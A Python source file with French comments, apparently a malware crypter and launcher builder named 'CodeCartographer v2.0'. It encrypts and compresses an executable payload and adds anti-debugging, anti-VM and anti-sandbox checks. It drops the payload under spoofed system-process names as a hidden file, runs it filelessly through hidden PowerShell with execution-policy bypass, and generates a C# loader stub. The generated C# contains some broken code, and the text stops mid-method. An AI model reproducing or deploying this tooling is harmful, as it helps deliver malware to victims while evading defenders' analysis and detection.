#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CodeCartographer v2.0 - Payload Protector & Launcher
Système de protection d'exécutable C# avec:
- Compression multi-niveaux (zlib, bz2, lzma)
- Chiffrement AES-256-GCM + ChaCha20-Poly1305
- Anti-debugging / Anti-VM / Anti-sandbox
- Exécution standard (fichier temporaire) ou Fileless (en mémoire)
- Obfuscation de chaînes et de flux
- Intégrité du payload (HMAC-SHA256)
"""

import sys
import os
import base64
import zlib
import struct
import hashlib
import hmac
import tempfile
import subprocess
import time
import random
import string
import ctypes
import platform
import json
import warnings
from pathlib import Path
from datetime import datetime

# ============================================================
# CONFIGURATION UTILISATEUR
# ============================================================

class Config:
    """Configuration complète du système de protection."""
    
    # === COMPRESSION ===
    COMPRESSION_ENABLED = True
    COMPRESSION_LEVEL = 9
    COMPRESSION_ALGORITHM = "zlib"
    COMPRESSION_LAYERS = 2
    
    # === CHIFFREMENT ===
    ENCRYPTION_ENABLED = True
    ENCRYPTION_ALGORITHM = "aes"
    KEY_DERIVATION = "pbkdf2"
    PBKDF2_ITERATIONS = 500000
    
    # === FURTIVITÉ ===
    STEALTH_ENABLED = True
    STRING_OBFUSCATION = True
    CONTROL_FLOW_FLATTENING = True
    DEAD_CODE_INSERTION = True
    
    # === ANTI-REVERSE ===
    ANTI_DEBUG_ENABLED = True
    ANTI_VM_ENABLED = True
    ANTI_SANDBOX_ENABLED = True
    ANTI_DUMPER_ENABLED = True
    TIMING_CHECKS = True
    
    # === EXÉCUTION ===
    EXECUTION_MODE = "fileless"
    SELF_DELETE = False
    PROCESS_SPOOFING = True
    INJECTION_TECHNIQUE = "apc"
    
    # === INTÉGRITÉ ===
    INTEGRITY_CHECK = True
    HARDWARE_BINDING = False
    EXPIRATION_DATE = None
    
    # === MISC ===
    VERBOSE = False
    DELAY_EXECUTION = 0
    DECOY_OPERATIONS = True

# ============================================================
# UTILITAIRES CRYPTOGRAPHIQUES
# ============================================================

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    warnings.warn("Module 'cryptography' non installé. Chiffrement fallback activé.")


def derive_key(password: bytes, salt: bytes, algorithm: str = "pbkdf2", iterations: int = 500000) -> bytes:
    """Dérive une clé sécurisée à partir d'un mot de passe."""
    if CRYPTO_AVAILABLE and algorithm == "pbkdf2":
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=iterations,
            backend=default_backend()
        )
        return kdf.derive(password)
    elif CRYPTO_AVAILABLE and algorithm == "scrypt":
        kdf = Scrypt(
            salt=salt,
            length=32,
            n=2**14,
            r=8,
            p=1,
            backend=default_backend()
        )
        return kdf.derive(password)
    else:
        return hashlib.pbkdf2_hmac('sha256', password, salt, iterations, dklen=32)


def encrypt_aes_gcm(plaintext: bytes, key: bytes) -> bytes:
    """Chiffre avec AES-256-GCM."""
    if CRYPTO_AVAILABLE:
        aesgcm = AESGCM(key)
        nonce = os.urandom(12)
        ciphertext = aesgcm.encrypt(nonce, plaintext, None)
        return nonce + ciphertext
    else:
        nonce = os.urandom(16)
        ciphertext = bytes(b ^ key[i % len(key)] for i, b in enumerate(plaintext))
        mac = hmac.new(key, nonce + ciphertext, hashlib.sha256).digest()[:16]
        return nonce + mac + ciphertext


def decrypt_aes_gcm(ciphertext: bytes, key: bytes) -> bytes:
    """Déchiffre avec AES-256-GCM."""
    if CRYPTO_AVAILABLE:
        aesgcm = AESGCM(key)
        nonce = ciphertext[:12]
        encrypted = ciphertext[12:]
        return aesgcm.decrypt(nonce, encrypted, None)
    else:
        nonce = ciphertext[:16]
        mac = ciphertext[16:32]
        encrypted = ciphertext[32:]
        expected_mac = hmac.new(key, nonce + encrypted, hashlib.sha256).digest()[:16]
        if not hmac.compare_digest(mac, expected_mac):
            raise ValueError("Intégrité compromise")
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(encrypted))


def encrypt_chacha20(plaintext: bytes, key: bytes) -> bytes:
    """Chiffre avec ChaCha20-Poly1305."""
    if CRYPTO_AVAILABLE:
        chacha = ChaCha20Poly1305(key)
        nonce = os.urandom(12)
        ciphertext = chacha.encrypt(nonce, plaintext, None)
        return nonce + ciphertext
    else:
        return encrypt_aes_gcm(plaintext, key)


def decrypt_chacha20(ciphertext: bytes, key: bytes) -> bytes:
    """Déchiffre avec ChaCha20-Poly1305."""
    if CRYPTO_AVAILABLE:
        chacha = ChaCha20Poly1305(key)
        nonce = ciphertext[:12]
        encrypted = ciphertext[12:]
        return chacha.decrypt(nonce, encrypted, None)
    else:
        return decrypt_aes_gcm(ciphertext, key)


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    """Chiffrement XOR avec clé étendue."""
    extended_key = hashlib.sha256(key * 2).digest() + hashlib.sha256(key[::-1] * 2).digest()
    return bytes(b ^ extended_key[i % len(extended_key)] for i, b in enumerate(data))

# ============================================================
# UTILITAIRES DE COMPRESSION
# ============================================================

try:
    import bz2
    BZ2_AVAILABLE = True
except ImportError:
    BZ2_AVAILABLE = False

try:
    import lzma
    LZMA_AVAILABLE = True
except ImportError:
    LZMA_AVAILABLE = False


def compress_data(data: bytes, algorithm: str = "zlib", level: int = 9, layers: int = 1) -> bytes:
    """Compresse les données avec l'algorithme spécifié."""
    result = data
    for _ in range(layers):
        if algorithm == "zlib":
            result = zlib.compress(result, level=level)
        elif algorithm == "bz2" and BZ2_AVAILABLE:
            result = bz2.compress(result, compresslevel=level)
        elif algorithm == "lzma" and LZMA_AVAILABLE:
            result = lzma.compress(result, preset=level)
        result = struct.pack("<I", len(result)) + result
    return result


def decompress_data(data: bytes, algorithm: str = "zlib", layers: int = 1) -> bytes:
    """Décompresse les données."""
    result = data
    for _ in range(layers):
        size = struct.unpack("<I", result[:4])[0]
        compressed = result[4:4+size]
        result = result[4+size:]
        
        if algorithm == "zlib":
            result = zlib.decompress(compressed)
        elif algorithm == "bz2" and BZ2_AVAILABLE:
            result = bz2.decompress(compressed)
        elif algorithm == "lzma" and LZMA_AVAILABLE:
            result = lzma.decompress(compressed)
    return result

# ============================================================
# OBFUSCATION DE CHAÎNES
# ============================================================

def obfuscate_string(s: str, seed: int = None) -> str:
    """Obfusque une chaîne en base64 avec XOR rotatif."""
    if seed is None:
        seed = random.randint(1, 255)
    data = s.encode('utf-8')
    obfuscated = bytes((b + seed + i) % 256 for i, b in enumerate(data))
    return "{:03d}".format(seed) + base64.b64encode(obfuscated).decode()


def deobfuscate_string(obfuscated: str) -> str:
    """Désobfusque une chaîne."""
    seed = int(obfuscated[:3])
    data = base64.b64decode(obfuscated[3:])
    return bytes((b - seed - i) % 256 for i, b in enumerate(data)).decode('utf-8')

# ============================================================
# ANTI-DEBUGGING / ANTI-VM / ANTI-SANDBOX
# ============================================================

def check_debugger() -> bool:
    """Détecte la présence d'un débogueur."""
    if sys.platform == "win32":
        try:
            kernel32 = ctypes.windll.kernel32
            if kernel32.IsDebuggerPresent():
                return True
            debugger_present = ctypes.c_bool(False)
            kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), ctypes.byref(debugger_present))
            if debugger_present.value:
                return True
            peb = ctypes.windll.ntdll.NtCurrentTeb().Peb
            if peb and hasattr(peb, 'BeingDebugged') and peb.BeingDebugged:
                return True
        except:
            pass
    return False


def check_vm() -> bool:
    """Détecte l'exécution dans une VM."""
    vm_indicators = []
    
    vm_processes = [
        "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
        "vboxservice.exe", "vboxtray.exe", "qemu-ga.exe",
        "xenservice.exe", "joeboxcontrol.exe", "joeboxserver.exe",
        "prl_tools.exe", "prl_cc.exe", "xsvc_devenv.exe"
    ]
    
    if sys.platform == "win32":
        try:
            import psutil
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and proc.info['name'].lower() in vm_processes:
                    vm_indicators.append(proc.info['name'])
        except:
            pass
        
        try:
            import wmi
            c = wmi.WMI()
            for bios in c.Win32_BIOS():
                if any(x in str(bios).lower() for x in ['vmware', 'virtualbox', 'qemu', 'xen', 'parallels']):
                    vm_indicators.append("BIOS_VM")
            for disk in c.Win32_DiskDrive():
                if any(x in str(disk).lower() for x in ['vmware', 'virtualbox', 'qemu', 'xen']):
                    vm_indicators.append("DISK_VM")
        except:
            pass
    
    try:
        import uuid
        mac = uuid.getnode()
        mac_prefix = "{:02x}:{:02x}:{:02x}".format((mac >> 40) & 0xff, (mac >> 32) & 0xff, (mac >> 24) & 0xff)
        vm_macs = ["08:00:27", "00:50:56", "00:0c:29", "00:15:5d", "00:16:3e", "00:1c:42"]
        if any(mac_prefix.startswith(prefix) for prefix in vm_macs):
            vm_indicators.append("MAC_VM")
    except:
        pass
    
    return len(vm_indicators) > 0


def check_sandbox() -> bool:
    """Détecte l'exécution dans un sandbox."""
    indicators = []
    
    try:
        if os.cpu_count() and os.cpu_count() < 2:
            indicators.append("LOW_CPU")
    except:
        pass
    
    if sys.platform == "win32":
        try:
            kernel32 = ctypes.windll.kernel32
            class MEMORYSTATUSEX(ctypes.Structure):
                _fields_ = [
                    ("dwLength", ctypes.c_ulong),
                    ("dwMemoryLoad", ctypes.c_ulong),
                    ("ullTotalPhys", ctypes.c_ulonglong),
                    ("ullAvailPhys", ctypes.c_ulonglong),
                    ("ullTotalPageFile", ctypes.c_ulonglong),
                    ("ullAvailPageFile", ctypes.c_ulonglong),
                    ("ullTotalVirtual", ctypes.c_ulonglong),
                    ("ullAvailVirtual", ctypes.c_ulonglong),
                    ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
                ]
            memStatus = MEMORYSTATUSEX()
            memStatus.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
            kernel32.GlobalMemoryStatusEx(ctypes.byref(memStatus))
            total_ram_mb = memStatus.ullTotalPhys / (1024 * 1024)
            if total_ram_mb < 2048:
                indicators.append("LOW_RAM")
        except:
            pass
    
    try:
        import psutil
        if len(list(psutil.process_iter())) < 50:
            indicators.append("LOW_PROCS")
    except:
        pass
    
    try:
        if sys.platform == "win32":
            free_space = ctypes.c_ulonglong(0)
            ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                ctypes.c_wchar_p("C:\\ "), None, None, ctypes.pointer(free_space)
            )
            if free_space.value / (1024**3) > 100:
                indicators.append("HIGH_DISK")
    except:
        pass
    
    return len(indicators) > 1


def timing_check() -> bool:
    """Vérifie les anomalies de timing."""
    times = []
    for _ in range(5):
        start = time.perf_counter()
        _ = [i ** 2 for i in range(10000)]
        end = time.perf_counter()
        times.append(end - start)
    
    avg = sum(times) / len(times)
    for t in times:
        if t > avg * 5:
            return True
    return False


def perform_security_checks(config: Config) -> bool:
    """Effectue toutes les vérifications de sécurité."""
    threats = []
    
    if config.ANTI_DEBUG_ENABLED and check_debugger():
        threats.append("DEBUGGER")
    
    if config.ANTI_VM_ENABLED and check_vm():
        threats.append("VM")
    
    if config.ANTI_SANDBOX_ENABLED and check_sandbox():
        threats.append("SANDBOX")
    
    if config.TIMING_CHECKS and timing_check():
        threats.append("TIMING")
    
    if threats:
        if config.VERBOSE:
            print("[SECURITE] Menaces detectees: {}".format(', '.join(threats)))
        return False
    return True

# ============================================================
# OPÉRATIONS LEURRES (DECOY)
# ============================================================

def decoy_operations():
    """Effectue des opérations leurres pour tromper l'analyse."""
    operations = [
        lambda: hashlib.sha256(os.urandom(1024)).hexdigest(),
        lambda: base64.b64encode(os.urandom(512)).decode(),
        lambda: sum(random.randint(1, 1000) for _ in range(1000)),
        lambda: ''.join(random.choices(string.ascii_letters, k=100)),
    ]
    
    for _ in range(random.randint(3, 8)):
        op = random.choice(operations)
        _ = op()
        time.sleep(random.uniform(0.001, 0.01))

# ============================================================
# EXÉCUTION STANDARD (FICHIER TEMPORAIRE)
# ============================================================

def execute_standard(exe_data: bytes, config: Config) -> int:
    """Exécute le payload en écrivant un fichier temporaire."""
    random_name = ''.join(random.choices(string.ascii_lowercase, k=12)) + ".exe"
    
    if config.PROCESS_SPOOFING:
        fake_names = ["svchost.exe", "explorer.exe", "notepad.exe", "dllhost.exe"]
        random_name = random.choice(fake_names)
    
    temp_dir = tempfile.gettempdir()
    temp_path = os.path.join(temp_dir, random_name)
    
    try:
        with open(temp_path, 'wb') as f2:
            f2.write(exe_data)
        
        if sys.platform == "win32":
            ctypes.windll.kernel32.SetFileAttributesW(temp_path, 0x02)
        
        if config.VERBOSE:
            print("[EXEC] Fichier temporaire: {}".format(temp_path))
        
        process = subprocess.Popen(
            [temp_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
        )
        
        stdout, stderr = process.communicate()
        
        if config.VERBOSE:
            if stdout:
                print("[OUTPUT] {}".format(stdout.decode('utf-8', errors='ignore')))
            if stderr:
                print("[ERROR] {}".format(stderr.decode('utf-8', errors='ignore')))
        
        if config.SELF_DELETE:
            try:
                os.remove(temp_path)
                if config.VERBOSE:
                    print("[CLEANUP] Fichier temporaire supprime")
            except:
                pass
        
        return process.returncode
        
    except Exception as e:
        if config.VERBOSE:
            print("[ERREUR] Execution standard: {}".format(e))
        return -1

# ============================================================
# EXÉCUTION FILELESS (EN MÉMOIRE)
# ============================================================

def execute_fileless(exe_data: bytes, config: Config) -> int:
    """Exécute le payload directement en mémoire sans toucher le disque."""
    
    if sys.platform != "win32":
        return execute_standard(exe_data, config)
    
    try:
        encoded_exe = base64.b64encode(exe_data).decode()
        
        ps_script = """
$encoded = "{}"
$bytes = [System.Convert]::FromBase64String($encoded)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPoint = $assembly.EntryPoint
if ($entryPoint) {
    $entryPoint.Invoke($null, @(@()))
} else {
    $types = $assembly.GetTypes()
    foreach ($type in $types) {
        $method = $type.GetMethod("Main")
        if ($method -and $method.IsStatic) {
            $method.Invoke($null, @(@()))
            break
        }
    }
}
""".format(encoded_exe)
        
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0
        
        process = subprocess.Popen(
            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", ps_script],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        stdout, stderr = process.communicate()
        
        if config.VERBOSE:
            if stdout:
                print("[OUTPUT] {}".format(stdout.decode('utf-8', errors='ignore')))
            if stderr:
                print("[ERROR] {}".format(stderr.decode('utf-8', errors='ignore')))
        
        return process.returncode
        
    except Exception as e:
        if config.VERBOSE:
            print("[ERREUR] Execution fileless: {}".format(e))
        return execute_standard(exe_data, config)

# ============================================================
# INTÉGRITÉ ET VALIDATION
# ============================================================

def verify_integrity(data: bytes, expected_hash: bytes) -> bool:
    """Vérifie l'intégrité du payload avec HMAC-SHA256."""
    if len(data) < 32:
        return False
    payload = data[:-32]
    stored_hmac = data[-32:]
    computed_hmac = hashlib.sha256(payload).digest()
    return hmac.compare_digest(stored_hmac, computed_hmac)


def check_expiration(config: Config) -> bool:
    """Vérifie si la licence a expiré."""
    if config.EXPIRATION_DATE is None:
        return True
    try:
        expiry = datetime.strptime(config.EXPIRATION_DATE, "%Y-%m-%d")
        return datetime.now() <= expiry
    except:
        return True

# ============================================================
# GÉNÉRATEUR DE PAYLOAD (CÔTÉ PYTHON)
# ============================================================

class PayloadGenerator:
    """Génère un payload C# protégé à partir d'un exécutable."""
    
    def __init__(self, config: Config = None):
        self.config = config or Config()
    
    def generate_password(self) -> str:
        """Génère un mot de passe aléatoire complexe."""
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        return ''.join(random.choices(chars, k=32))
    
    def process_payload(self, exe_path: str) -> dict:
        """Traite un fichier exécutable et retourne les données protégées."""
        
        with open(exe_path, 'rb') as f2:
            raw_data = f2.read()
        
        if self.config.VERBOSE:
            print("[INFO] Fichier lu: {} octets".format(len(raw_data)))
        
        if self.config.COMPRESSION_ENABLED:
            compressed = compress_data(
                raw_data,
                algorithm=self.config.COMPRESSION_ALGORITHM,
                level=self.config.COMPRESSION_LEVEL,
                layers=self.config.COMPRESSION_LAYERS
            )
            if self.config.VERBOSE:
                ratio = len(compressed) / len(raw_data) * 100
                print("[INFO] Compression: {} octets ({:.1f}%)".format(len(compressed), ratio))
        else:
            compressed = raw_data
        
        if self.config.ENCRYPTION_ENABLED:
            password = self.generate_password()
            salt = os.urandom(32)
            key = derive_key(
                password.encode(),
                salt,
                algorithm=self.config.KEY_DERIVATION,
                iterations=self.config.PBKDF2_ITERATIONS
            )
            
            if self.config.ENCRYPTION_ALGORITHM == "aes":
                encrypted = encrypt_aes_gcm(compressed, key)
            elif self.config.ENCRYPTION_ALGORITHM == "chacha20":
                encrypted = encrypt_chacha20(compressed, key)
            else:
                encrypted = xor_encrypt(compressed, key)
            
            encrypted = salt + encrypted
            
            if self.config.VERBOSE:
                print("[INFO] Chiffrement: {}".format(self.config.ENCRYPTION_ALGORITHM))
        else:
            encrypted = compressed
            password = None
            salt = None
        
        if self.config.INTEGRITY_CHECK:
            integrity_hash = hashlib.sha256(encrypted).digest()
            encrypted = encrypted + integrity_hash
        
        final_payload = base64.b64encode(encrypted).decode()
        
        return {
            "payload": final_payload,
            "password": password,
            "salt": base64.b64encode(salt).decode() if salt else None,
            "original_size": len(raw_data),
            "protected_size": len(final_payload),
            "compression_ratio": len(final_payload) / len(raw_data) * 100
        }
    
    def generate_csharp_loader(self, payload_data: dict) -> str:
        """Génère le code C# du loader."""
        
        config = self.config
        cs_lines = []
        
        # Header
        cs_lines.append("// Auto-generated Protected Loader")
        cs_lines.append("// Generated: " + datetime.now().isoformat())
        cs_lines.append("// Protection Level: HIGH")
        cs_lines.append("")
        cs_lines.append("using System;")
        cs_lines.append("using System.IO;")
        cs_lines.append("using System.Security.Cryptography;")
        cs_lines.append("using System.Text;")
        cs_lines.append("using System.Diagnostics;")
        cs_lines.append("using System.Linq;")
        cs_lines.append("using System.Runtime.InteropServices;")
        cs_lines.append("using System.Threading;")
        cs_lines.append("using Microsoft.Win32;")
        cs_lines.append("")
        cs_lines.append("namespace ProtectedLoader")
        cs_lines.append("{")
        cs_lines.append("    class Program")
        cs_lines.append("    {")
        
        # Payload
        cs_lines.append("        // Configuration de protection")
        cs_lines.append("        private static readonly string _encryptedPayload = @\"" + payload_data["payload"] + "\";")
        
        # Encryption vars
        if config.ENCRYPTION_ENABLED:
            cs_lines.append("        private static readonly string _password = \"" + (payload_data["password"] or "") + "\";")
            cs_lines.append("        private static readonly string _saltB64 = \"" + (payload_data["salt"] or "") + "\";")
        
        # Config vars
        cs_lines.append("        private static readonly bool _antiDebug = " + str(config.ANTI_DEBUG_ENABLED).lower() + ";")
        cs_lines.append("        private static readonly bool _antiVM = " + str(config.ANTI_VM_ENABLED).lower() + ";")
        cs_lines.append("        private static readonly bool _antiSandbox = " + str(config.ANTI_SANDBOX_ENABLED).lower() + ";")
        cs_lines.append("        private static readonly bool _fileless = " + str(config.EXECUTION_MODE == "fileless").lower() + ";")
        cs_lines.append("        private static readonly bool _integrityCheck = " + str(config.INTEGRITY_CHECK).lower() + ";")
        if config.EXPIRATION_DATE:
            cs_lines.append("        private static readonly string _expirationDate = \"" + config.EXPIRATION_DATE + "\";")
        else:
            cs_lines.append("        private static readonly string _expirationDate = null;")
        
        # P/Invoke
        cs_lines.append("        [DllImport(\"kernel32.dll\")]")
        cs_lines.append("        private static extern bool IsDebuggerPresent();")
        cs_lines.append("")
        cs_lines.append("        [DllImport(\"kernel32.dll\", SetLastError = true)]")
        cs_lines.append("        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);")
        cs_lines.append("")
        cs_lines.append("        [DllImport(\"kernel32.dll\")]")
        cs_lines.append("        private static extern IntPtr GetCurrentProcess();")
        cs_lines.append("")
        cs_lines.append("        [DllImport(\"kernel32.dll\")]")
        cs_lines.append("        private static extern uint SetFileAttributes(string lpFileName, uint dwFileAttributes);")
        cs_lines.append("")
        cs_lines.append("        private const uint FILE_ATTRIBUTE_HIDDEN = 0x2;")
        cs_lines.append("        private const uint FILE_ATTRIBUTE_SYSTEM = 0x4;")
        
        # Main method
        cs_lines.append("")
        cs_lines.append("        static void Main(string[] args)")
        cs_lines.append("        {")
        cs_lines.append("            try")
        cs_lines.append("            {")
        
        # Delay
        if config.DELAY_EXECUTION > 0:
            cs_lines.append("                Thread.Sleep(" + str(config.DELAY_EXECUTION * 1000) + ");")
        
        # Security checks
        cs_lines.append("                // Verifications de securite")
        cs_lines.append("                if (_antiDebug && CheckDebugger())")
        cs_lines.append("                {")
        cs_lines.append("                    Environment.Exit(1);")
        cs_lines.append("                    return;")
        cs_lines.append("                }")
        cs_lines.append("")
        cs_lines.append("                if (_antiVM && CheckVM())")
        cs_lines.append("                {")
        cs_lines.append("                    Environment.Exit(1);")
        cs_lines.append("                    return;")
        cs_lines.append("                }")
        cs_lines.append("")
        cs_lines.append("                if (_antiSandbox && CheckSandbox())")
        cs_lines.append("                {")
        cs_lines.append("                    Environment.Exit(1);")
        cs_lines.append("                    return;")
        cs_lines.append("                }")
        cs_lines.append("")
        
        # Expiration check
        if config.EXPIRATION_DATE:
            cs_lines.append("                // Verification d'expiration")
            cs_lines.append("                if (_expirationDate != null)")
            cs_lines.append("                {")
            cs_lines.append("                    DateTime expiry = DateTime.ParseExact(_expirationDate, \"yyyy-MM-dd\", null);")
            cs_lines.append("                    if (DateTime.Now > expiry)")
            cs_lines.append("                    {")
            cs_lines.append("                        Environment.Exit(1);")
            cs_lines.append("                        return;")
            cs_lines.append("                    }")
            cs_lines.append("                }")
            cs_lines.append("")
        
        # Decode payload
        cs_lines.append("                // Decoder le payload")
        cs_lines.append("                byte[] encryptedData = Convert.FromBase64String(_encryptedPayload);")
        cs_lines.append("")
        
        # Integrity check
        if config.INTEGRITY_CHECK:
            cs_lines.append("                // Verification d'integrite")
            cs_lines.append("                if (_integrityCheck)")
            cs_lines.append("                {")
            cs_lines.append("                    byte[] storedHash = new byte[32];")
            cs_lines.append("                    Array.Copy(encryptedData, encryptedData.Length - 32, storedHash, 0, 32);")
            cs_lines.append("                    byte[] payloadData = new byte[encryptedData.Length - 32];")
            cs_lines.append("                    Array.Copy(encryptedData, 0, payloadData, 0, payloadData.Length);")
            cs_lines.append("")
            cs_lines.append("                    using (SHA256 sha256 = SHA256.Create())")
            cs_lines.append("                    {")
            cs_lines.append("                        byte[] computedHash = sha256.ComputeHash(payloadData);")
            cs_lines.append("                        if (!computedHash.SequenceEqual(storedHash))")
            cs_lines.append("                        {")
            cs_lines.append("                            Environment.Exit(1);")
            cs_lines.append("                            return;")
            cs_lines.append("                        }")
            cs_lines.append("                    }")
            cs_lines.append("                    encryptedData = payloadData;")
            cs_lines.append("                }")
            cs_lines.append("")
        
        # Decrypt call
        if config.ENCRYPTION_ENABLED:
            cs_lines.append("                // Dechiffrement")
            cs_lines.append("                byte[] decryptedData = DecryptPayload(encryptedData);")
        else:
            cs_lines.append("                byte[] decryptedData = encryptedData;")
        cs_lines.append("")
        
        # Decompress call
        if config.COMPRESSION_ENABLED:
            cs_lines.append("                // Decompression")
            cs_lines.append("                byte[] exeData = DecompressPayload(decryptedData);")
        else:
            cs_lines.append("                byte[] exeData = decryptedData;")
        cs_lines.append("")
        
        # Execution
        cs_lines.append("                // Execution")
        cs_lines.append("                if (_fileless)")
        cs_lines.append("                {")
        cs_lines.append("                    ExecuteFileless(exeData);")
        cs_lines.append("                }")
        cs_lines.append("                else")
        cs_lines.append("                {")
        cs_lines.append("                    ExecuteStandard(exeData);")
        cs_lines.append("                }")
        cs_lines.append("            }")
        cs_lines.append("            catch")
        cs_lines.append("            {")
        cs_lines.append("                Environment.Exit(1);")
        cs_lines.append("            }")
        cs_lines.append("        }")
        
        # CheckDebugger method
        cs_lines.append("")
        cs_lines.append("        private static bool CheckDebugger()")
        cs_lines.append("        {")
        cs_lines.append("            if (IsDebuggerPresent()) return true;")
        cs_lines.append("            bool debuggerPresent = false;")
        cs_lines.append("            CheckRemoteDebuggerPresent(GetCurrentProcess(), ref debuggerPresent);")
        cs_lines.append("            return debuggerPresent;")
        cs_lines.append("        }")
        
        # CheckVM method
        cs_lines.append("")
        cs_lines.append("        private static bool CheckVM()")
        cs_lines.append("        {")
        cs_lines.append("            try")
        cs_lines.append("            {")
        cs_lines.append("                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(\"SELECT * FROM Win32_BIOS\"))")
        cs_lines.append("                {")
        cs_lines.append("                    foreach (ManagementObject obj in searcher.Get())")
        cs_lines.append("                    {")
        cs_lines.append("                        string biosInfo = obj.ToString().ToLower();")
        cs_lines.append("                        if (biosInfo.Contains(\"vmware\") || biosInfo.Contains(\"virtualbox\") ||")
        cs_lines.append("                            biosInfo.Contains(\"qemu\") || biosInfo.Contains(\"xen\"))")
        cs_lines.append("                            return true;")
        cs_lines.append("                    }")
        cs_lines.append("                }")
        cs_lines.append("            }")
        cs_lines.append("            catch { }")
        cs_lines.append("            return false;")
        cs_lines.append("        }")
        
        # CheckSandbox method
        cs_lines.append("")
        cs_lines.append("        private static bool CheckSandbox()")
        cs_lines.append("        {")
        cs_lines.append("            if (Environment.ProcessorCount < 2) return true;")
        cs_lines.append("            if (new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory < 2147483648) return true;")
        cs_lines.append("            return false;")
        cs_lines.append("        }")
        
        # DecryptPayload method
        if config.ENCRYPTION_ENABLED:
            cs_lines.append("")
            cs_lines.append("        private static byte[] DecryptPayload(byte[] encryptedData)")
            cs_lines.append("        {")
            cs_lines.append("            // Extraire le sel")
            cs_lines.append("            byte[] salt = Convert.FromBase64String(_saltB64);")
            cs_lines.append("            byte[] actualEncrypted = new byte[encryptedData.Length - salt.Length];")
            cs_lines.append("            Array.Copy(encryptedData, salt.Length, actualEncrypted, 0, actualEncrypted.Length);")
            cs_lines.append("")
            cs_lines.append("            // Deriver la cle")
            cs_lines.append("            using (Rfc2898DeriveBytes kdf = new Rfc2898DeriveBytes(_password, salt, " + str(config.PBKDF2_ITERATIONS) + ", HashAlgorithmName.SHA256))")
            cs_lines.append("            {")
            cs_lines.append("                byte[] key = kdf.GetBytes(32);")
            cs_lines.append("")
            if config.ENCRYPTION_ALGORITHM == "aes":
                cs_lines.append("                if (true) // AES-GCM")
            else:
                cs_lines.append("                if (false) // Not AES")
            cs_lines.append("                {")
            cs_lines.append("                    byte[] nonce = new byte[12];")
            cs_lines.append("                    Array.Copy(actualEncrypted, 0, nonce, 0, 12);")
            cs_lines.append("                    byte[] ciphertext = new byte[actualEncrypted.Length - 12];")
            cs_lines.append("                    Array.Copy(actualEncrypted, 12, ciphertext, 0, ciphertext.Length);")
            cs_lines.append("")
            cs_lines.append("                    using (AesGcm aesgcm = new AesGcm(key))")
            cs_lines.append("                    {")
            cs_lines.append("                        byte[] plaintext = new byte[ciphertext.Length - 16];")
            cs_lines.append("                        byte[] tag = new byte[16];")
            cs_lines.append("                        Array.Copy(ciphertext, ciphertext.Length - 16, tag, 0, 16);")
            cs_lines.append("                        Array.Copy(ciphertext, 0, ciphertext, 0, ciphertext.Length - 16);")
            cs_lines.append("                        aesgcm.Decrypt(nonce, ciphertext, tag, plaintext);")
            cs_lines.append("                        return plaintext;")
            cs_lines.append("                    }")
            cs_lines.append("                }")
            cs_lines.append("                else")
            cs_lines.append("                {")
            cs_lines.append("                    // Fallback XOR")
            cs_lines.append("                    byte[] extendedKey = SHA256.Create().ComputeHash(key.Concat(key).ToArray());")
            cs_lines.append("                    extendedKey = extendedKey.Concat(SHA256.Create().ComputeHash(key.Reverse().Concat(key.Reverse()).ToArray())).ToArray();")
            cs_lines.append("                    byte[] plaintext = new byte[actualEncrypted.Length];")
            cs_lines.append("                    for (int i = 0; i < actualEncrypted.Length; i++)")
            cs_lines.append("                        plaintext[i] = (byte)(actualEncrypted[i] ^ extendedKey[i % extendedKey.Length]);")
            cs_lines.append("                    return plaintext;")
            cs_lines.append("                }")
            cs_lines.append("            }")
            cs_lines.append("        }")
        
        # DecompressPayload method
        if config.COMPRESSION_ENABLED:
            cs_lines.append("")
            cs_lines.append("        private static byte[] DecompressPayload(byte[] compressedData)")
            cs_lines.append("        {")
            cs_lines.append("            using (MemoryStream input = new MemoryStream(compressedData))")
            cs_lines.append("            using (MemoryStream output = new MemoryStream())")
            cs_lines.append("            {")
            cs_lines.append("                for (int layer = 0; layer < " + str(config.COMPRESSION_LAYERS) + "; layer++)")
            cs_lines.append("                {")
            cs_lines.append("                    byte[] sizeBytes = new byte[4];")
            cs_lines.append("                    input.Read(sizeBytes, 0, 4);")
            cs_lines.append("                    int size = BitConverter.ToInt32(sizeBytes, 0);")
            cs_lines.append("                    byte[] layerData = new byte[size];")
            cs_lines.append("                    input.Read(layerData, 0, size);")
            cs_lines.append("")
            cs_lines.append("                    if (true) // " + config.COMPRESSION_ALGORITHM + "")
            cs_lines.append("                    {")
            cs_lines.append("                        using (System.IO.Compression.DeflateStream deflate = new System.IO.Compression.DeflateStream(new MemoryStream(layerData), System.IO.Compression.CompressionMode.Decompress))")
            cs_lines.append("                        {")
            cs_lines.append("                            deflate.CopyTo(output);")
            cs_lines.append("                        }")
            cs_lines.append("                    }")
            cs_lines.append("                    else")
            cs_lines.append("                    {")
